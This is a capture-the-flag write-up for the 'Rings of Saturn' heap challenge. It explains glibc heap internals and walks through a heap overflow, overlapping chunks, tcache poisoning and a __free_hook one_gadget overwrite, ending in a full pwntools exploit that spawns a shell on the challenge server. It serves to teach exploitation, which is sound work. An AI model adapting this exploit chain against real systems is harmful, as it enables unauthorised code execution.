# Rings of Saturn 
### "We’ll go to the moons of Jupiter, at least some of the outer ones for sure, and probably Titan on Saturn" - Elon Musk
#### Author: RII
`nc 0.cloud.chals.io 12053`

#### Provided Files: ring_of_saturn,ring_of_saturn_dbg,libc.so.6

## tl;dr 
Heap Overflow->Change Chunk Size->Overlapping Chunks->Tcache Posin->Allocate chunk near free_hook->SHELL

First time doing a writeup for heap challenges so let's add the \-vvv flag
 
## Setup and Debugging
Since a libc was provided we want to use it locally so I use [pwninit](https://github.com/io12/pwninit) to set up the binary and avoid dealing with ld_preload issues. It is also very helpful as it can unstrip the libc and download debug symbols

`pwninit --bin ring_of_saturn --libc libc.so.6`

They gave us two binaries and I had no clue what dbg was at the time so I never bother using it, smart move I know. 
The symbols in libc allow for [pwn-dbg's](https://github.com/pwndbg/pwndbg) heap commands to work properly so I switched over from [gef](https://github.com/hugsy/gef)

Pwninit also can be configured to use your own template scripts, here's mine

```python 
from pwn import *

exe = ELF("./rings_of_saturn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
gdbscript = '''
set breakpoint pending on
c
'''

p = gdb.debug([exe.path], gdbscript=gdbscript)

```
Note: I use `gdb.debug` as `gdb.attach` has historically never worked for me

### Overview
Running the binary seems to give us a libc address and surprisingly gdb shows that its actually an one_gadget as it says it is
```
 ~/ctf/space/ring_of_saturn $ gdb rings_of_saturn_patched
GNU gdb (GDB) 11.2
(gdb) r
Starting program: /home/ex4722/ctf/space/ring_of_saturn/rings_of_saturn_patched
Ok...I'll give you a one_gadget lol 0x7ffff7a33365
How large would you like your buffer to be, in bytes?
Must be (>= 1000)
> ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7af4191 in __GI___libc_read (fd=0, buf=0x7ffff7dcfa83 <_IO_2_1_stdin_+131>, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:27
27      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) x/2gx 0x7ffff7a33365
0x7ffff7a33365 <do_system+1045>:        0x310039e334358d48      0x894c00000002bfd2
```

```bash 
 ~/ctf/space/ring_of_saturn $ checksec rings_of_saturn
[*] '/home/ex4722/ctf/space/ring_of_saturn/rings_of_saturn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Running checksec on the binary shows that theirs no PIE and the libc leak means that aslr for libc has been defeated.

### Previous Knowledge
Much of this writeup will not make any sense if you don't know much about how the heap works and basic exploits such as tcache poisoning 



This youtube playlist by [pwn colege](https://www.youtube.com/watch?v=coAJ4KyrWmY&list=PL-ymxv0nOtqoUdeKoKMxZBlfd9pD3mAah) was the one I started with. 
This one by [azeria labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) and this one by [dhavalkapil](https://heap-exploitation.dhavalkapil.com/introduction) are also great starting points.

I will provide the bare minimum needed to solve this challenge but I will assume the reader already read some of the supplementary material 


## ~~Reverse Engineering~~ Dynamic Analysis
Usually, I would open it up in ghidra and look around but I was too lazy do didn't bother until the end, I think that it actually help me in this case as the decomp looked really bad
Running the program gives you a pretty good flow of execution and its pretty obvious that its a heap challenge with all those allocations

#### What we can do
0. Add- Calls malloc on the size given, larger than 1K so unsorted, tcache and large bin sizes
1. Remove- Calls free on an index
2. Print- outputs a TON of data but won't be as useful as we already have a libc leak
3. Write- Allows us to write data to allocations and no size check here 
4. Quit- Calls exit but also prints a goodbye message

With this understanding I created a handful of helper functions to speed up testing
```python
index = 0
def malloc(size):
    global index
    p.recvuntil(b"> ")
    p.sendline(b"0")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    index += 1
    return index

def free(index):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode('latin'))

def dump():
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"\n0. add")
    # return p.clean()

def write(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    p.sendline(data)
```

The malloc function seems to allocate chunks 24 larger than we requested. Looking at an allocated chunk in gdb we can tell that it's storing a lot of extra program metadata here
```gdb
pwndbg> heap
... 
Allocated chunk | PREV_INUSE
Addr: 0x893280
Size: 0x401

Top chunk | PREV_INUSE
Addr: 0x893680
Size: 0x20981

pwndbg> x/10gx 0x893280
0x893280:       0x0000000000000000      0x0000000000000401     <--- Size of chunk in memory placed by malloc
0x893290:       0x00000000008932a8      0x0000000000893290     <--- First chunk points the start of user writebale data, Second points to the first chunk allocated???
0x8932a0:       0x00000000000003e8      0x0000000000000000     <--- Size of user writeable data that we specifed with
0x8932b0:       0x0000000000000000      0x0000000000000000
0x8932c0:       0x0000000000000000      0x0000000000000000
pwndbg>
```

### Heap basics
Once upon a time, developers had to ask the kernel for memory but only in huge pages. This led to a large overhead and memory leaks so shared libraries sought to solve this issue by creating a system to request and return memory.
In particular glibc on linux uses malloc and free.

> The malloc() function allocates size bytes and returns a pointer to the allocated memory. 

> The free() function frees the memory space pointed to by ptr, which must have been returned by a previous call to malloc()

Chunks in memory contain a lot of information and this is a diagram from the [malloc source code](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) itself
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Theirs a lot of information here but the main takeaway is that the 
- The Size field of a chunk is BEFORE the user data 
- The size field of the next chunk is right after the user data of the chunk that comes before it

Once a chunk is freed it is assumed that the program won't use that chunk anymore so malloc can use it to store its data in it.
```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             FWD Pointer, next chunk                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             BCK Pointer,previous chunk                        |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space                                      |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
- Notice that the only difference is in the user data and the last 2 bits of the size 
- The size now holds pointers to chunks that are in its bin
- The bits after the size of the chunk changed but the only important bit is the P which is PREV_INUSE bit. This bit tracks if the chunk before it is still in use

### Bins
Bins are glibc's names for lists of freed chunks. Currently, libc has unsorted, large, small, fast, and tcache bins. For this exploit, we will be targeting mostly tcache bins but knowing the other bins is very helpful.

#### Tcache
- Tcache is a faster layer of caching that takes priority and is a singly linked list
- Each thread has 64 tcache bins, holding 7 chunks each of the same size
- Favoring speed meant that many security checks were sacrificed and attacks generally are easier as there are fewer security checks. 
Learning about tcache is really hard on paper so I would recommend creating a malloc testbed to malloc and free chunks. Using pwb-dbg's heap command `bin` shows how the bins look

Here is an example that mallocs 3 1 byte chunks and frees those chunks. Here is how the heap looks in gdb

![image](https://user-images.githubusercontent.com/77011982/161610308-9a00d038-827f-40ff-bec0-69bdb0bc9a74.png)


Tcache is singly linked so you can ignore the second pointer that points backward. 
Notice that the chunk's first 8 bytes of metadata point to the next chunk that can be used, this will be very important in part 2.


### Bug 
The write function looks kinda strange as it does not ask for an index but pretty obvious that theirs an overflow but what can we overwrite? With so much metadata placed by the program, we could maybe overwrite one of them to screw with program interactions
Running our script with `ipython -i ` allows us to call our helper functions and then break in gdb to examine the heap

```python
chunkA = malloc(1000)
chunkB = malloc(1000)
write(2000,b"A"*2000)
```

Before calling write the section between these chunks looks like this
```gdb 
pwndbg> x/10gx 0x1dbd670
0x1dbd670:      0x0000000000000000      0x0000000000000000
0x1dbd680:      0x0000000000000000      0x0000000000000411   <--- Size field
0x1dbd690:      0x0000000001dbd6a8      0x0000000001dbd290
0x1dbd6a0:      0x00000000000003e8      0x0000000000000000
0x1dbd6b0:      0x0000000000000000      0x0000000000000000
```
After calling the write 
```gdb 
pwndbg> x/10gx 0x1dbd670
0x1dbd670:      0x4141414141414141      0x4141414141414141
0x1dbd680:      0x4141414141414141      0x4141414141414141    <--- Overflowed size field
0x1dbd690:      0x0000000001dbd6a8      0x0000000001dbd290
0x1dbd6a0:      0x00000000000003e8      0x4141414141414141
0x1dbd6b0:      0x4141414141414141      0x4141414141414141
```

### TODO:
1. Seems like we have a one quad-word overflow into the size field. Changing the size of chunks may not seems like much but with a bit of heap magic we can get an overlapping allocation as shown by this how2heap [writeup](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c)
2. Once we have an overlapping allocation we can poison the [tcache](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c) by freeing a pointer then writing the metadata that is there.
3. Using the poisoned tcache we can get an allocation near the free_hook leading to a shell 

### Overlapping Allocations
Much of my knowledge about this comes from [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c). The overall goal of this exploit is to make a chunk larger than it actually is so that it swallows the next chunk leading to it being placed in a freed bin.
1. Allocate 4 chunks of the same size
2. Free the third chunk to tell malloc where the end of the chunk is (4th chunk is needed to stop heap consolidation if a chunk is freed right next to the top chunk it just merges with the top chunk)
3. Change the size field of chunk1 to be size(chunk1 + chunk2) 
4. Free chunk1, this will place it into the unsorted bin(Does not matter, just know it will be returned )
5. Allocate a chunk with size (chunk1 + chunk2) to get back our giant chunk, the second half of it will be the overlapping chunk

Getting this working with the binary was a lot harder as it acted pretty funny with me but nothing gdb can't solve. 

#### Gotchas: 
- In the beginning, the program asks us how large would you like your buffer and will malloc that size without any padding so 1000 in my exploit
- Writing 1000 bytes to pad that chunk and then size for chunk1 will be too much as malloc chunks contain metadata so writeable data is the size of the chunk - 8
- The size we want to write is the sum of each chunk's size  + 1, this for the PREV_INUSE bit and if it's not set the binary crashes ( Very interesting bit, many heap consolidation exploits use this )
- When we call malloc to get the chunk back we need to ask for the giant chunks size - 24 -8 as 24 bytes are added by the program for its own metadata and 8 bytes for malloc metadata


```python 
chunk1 =  malloc(1000)
chunk2 =  malloc(1000)
chunk3 =  malloc(1000)
chunk4 =  malloc(1000)  # Stop top chunk consolidatation

free(chunk3)   # Tells chunk where to end

write(992, b'A'*992 )   # Padding for the first chunk
write(8, p64(0x410 + 0x410 + 1) )  # Overwrites size field, sizeof(chunk1) *2 & 1


free(chunk1)   # in unsorted bin
giant = malloc(0x820 - 8 - 24) # get back chunk1/chunk2, sub 8 for malloc metadata, sub 24 for program metadata
```


### Poison Tcache
Knowing that tcache is just a singly linked list means that if we change one entry we can change how the list looks we may get an arbitrary write primitive. 
Using our testing script we can use some gdb fu to change a value in the linked list and see how our tcache bins is compelty screwed
```gdb 
pwndbg> bin
tcachebins
0x20 [  3]: 0xfdb2e0 —▸ 0xfdb2c0 —▸ 0xfdb2a0 ◂— 0x0
pwndbg> set *(u_int)0xfdb2e0=0xdeadbeef
pwndbg> bin
tcachebins
0x20 [  3]: 0xfdb2e0 ◂— 0xdeadbeef
```
The tcache bin now contains two chunks, one that we overwrote(0xfdb2e0) and one with the value that we wrote(0xdeadbeef)
If we call malloc once we will get the first chunk of (0xfdb2e0) and the next chunk will be 0xdeadbeef. 

So how do we get from an overlapping chunk to a tcache poisoning? The program is very strict about writing to chunks that are freed but with overlapping chunks, we can cause the program to allocate the same chunk twice, once legitamently and once from the giant chunk. 
After we have both chunks allocated we can free our reference to the legitimate chunk causing tcache metadata to be placed there. With the giant consolidate chunk we can then write to that chunk


#### Gotchas: 
- Due to how write works we need to write a bit of padding for each chunk that we allocated before we reach our target chunk
```python 
free(1)        #  This is chunk2 aka the second half of giant the chunk

write(1000, b'C'*1000 ) 
write(1008, b'D'*1008)

write(0x18 , p64(0x411) + p64(0xdeadbeef) +p64(0xcafebabe))  
```

After running this section we see that we have full control over the tcache bin
```gdb 
pwndbg> bin
tcachebins
0x410 [  2]: 0x18baaa0 ◂— 0xdeadbeef
```

### WIN??? 
Overwrite free_hook with the address of one_gadget and then call free for a shell?


This was probably the hardest part for me. After getting an arbitrary write primitive I ran into so many issues 
#### Gotchas: 
- Remember that the program writes some metadata so we need to allocate at 0xdeadbeef - 24 to get 0xdeadbeef
- The program kept hanging in `__lll_lock_wait_private` for some reason, doing a binary search showed that touching `_IO_stdfile_2_lock` caused it
- Solved this issue by writing nulls instead of A's (Guess it means I'm no longer a pro pwner )
- Before free hook is some more data I didn't want to mess around with so I just allocated at free_hook - 0x50 as it worked the first try here
- This offset can be changed as long as there are 24 bytes of writeable data after that chunk
- To minimize writing I freed all possible chunks leaving  only the free_hook and chunk2 ( could not free this ) 

```python 
free(1)
dummy = malloc(1000) 
hook = malloc(1000)

free(giant)
free(chunk4)
free(dummy)

write(1000 + 0, b'F'*(1000 + 0))   # Can't free chunk2 so just padd it
write(32 + 24, b'\x00'*(32 + 24))     #  Used nulls to avoid touching IO Locks

write(8, p64(libc.address + 0x10a45c))  # One_gadget
p.sendline(b"1")
p.sendline(b"1")   # Call a valid free
p.interactive()  # SHELL :)
```

#### Rabbit Holes 
1. Overwrite GOT entry: Failed as the extra 24 bytes of program metadata would nuke the GOT table, the first entry - 24 is not even mapped so writing their will segfault
2. Overwrite malloc_hook: Heard from a teammate that scanf will call malloc for larger sizes but the one gadget never worked due to the stack not being NULL
3. Overwrite free hook with system: Forgot about one_gadgets for a moment and tried writing b'/bin/sh\0' to a chunk and then freeing that chunk. This is possible but didn't have the time to play around with it

### Full exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rings_of_saturn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
index = 0

def malloc(size):
    global index
    p.recvuntil(b"> ")
    p.sendline(b"0")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    index += 1
    return index



def free(index):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(str(index).encode('latin'))

def dump():
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"\n0. add")
    return p.recvuntil(b"\n0. add")
    # return p.clean()

def write(size, data):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"> ")
    p.sendline(str(size).encode('latin'))
    p.sendline(data)


gdbscript = '''
set breakpoint pending on
b execve 
c
'''

# p = gdb.debug([exe.path], gdbscript=gdbscript)
p = remote("0.cloud.chals.io",12053)
p.recvuntil(b'lol ')
leak_value = int(p.recvline(),16)
leak_value -= libc.symbols['exit'] + 0xc195
libc.address = leak_value

p.recvuntil(b"> ")
p.sendline(b"1000")

chunk1 =  malloc(1000)
chunk2 =  malloc(1000)
chunk3 =  malloc(1000)
chunk4 =  malloc(1000)  # Stop top chunk consolidatation

free(chunk3)  # Tells chunk where to end

write(992, b'A'*992 )   # Padding for the first chunk
write(8, p64(0x410 + 0x410 + 1) )  # Overwrites size field, sizeof(chunk1) *2 & 1


free(chunk1)   # in unsorted bin
giant = malloc(0x820 - 8 - 24) # get back chunk1/chunk2, sub 8 for malloc metadata, sub 24 for program metadata 

free(1)        #  This is chunk2  aka second half of giant chunk

write(1000, b'C'*1000 )  # Just padding stuff
write(1008, b'D'*1008)

# write(0x18 , p64(0x411) + p64(libc.sym.__malloc_hook -0x20 ) + p64(0xcafebabeb))
write(0x18 , p64(0x411) + p64(libc.sym.__free_hook - 0x50) + p64(0xcafebabeb))

dummy = malloc(1000)  # This chunks fd pointer was overwritten
hook = malloc(1000)  # This is pointer to free_hook

free(giant)
free(chunk4)
free(dummy)

write(1000 + 0, b'F'*(1000 + 0))    # Can't free chunk2 so just padd it
write(32 + 24, b'\x00'*(32 + 24))  #  Used nulls to avoid touching IO Locks before free hook

write(8, p64(libc.address + 0x10a45c))  # One_gadget
p.sendline(b"1")
p.sendline(b"1")  # Call a valid free
p.clean()         # Clean up buffering garbage
p.interactive()   # SHELL :)

'''
NOTES:
After mallocing chunk
p64(ADDR OF 4th)   --------------
p64(????)                       |
p64(size_user_specificed)       |
p64(0)                        <-|
One_gadget in scanf that calls malloc fails for some reason
One_gadget in malloc_hook fails but free works, stupid locks 
'''


```


Running the exploit now on the shell server gives us the flag:

![image](https://user-images.githubusercontent.com/77011982/161623091-2b4ca241-ba0e-4905-bb23-62f971757a6a.png)



